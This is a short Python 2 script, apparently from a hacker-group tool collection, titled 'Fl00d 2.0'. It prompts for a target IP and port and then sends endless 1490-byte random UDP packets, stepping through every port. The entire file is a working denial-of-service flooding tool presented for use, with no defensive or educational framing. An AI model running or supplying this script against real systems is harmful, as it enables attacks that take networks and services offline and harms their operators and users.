#!/system/bin/python
#Fl00d 2.0 27-06-2017 (1:42)
#Tool for UDP Flood
#Authorized by DedSecTL
#AndroSec1337 Cyber Team
import socket, os, random, time

# Color
B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

# Code time ##################
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############################

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")

ip = raw_input('[$] T@rget 1P: ')
port = input('[$] P0rt: ')
os.system("clear")

time.sleep(3)
print
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     
     if port == 65534:
       port = 1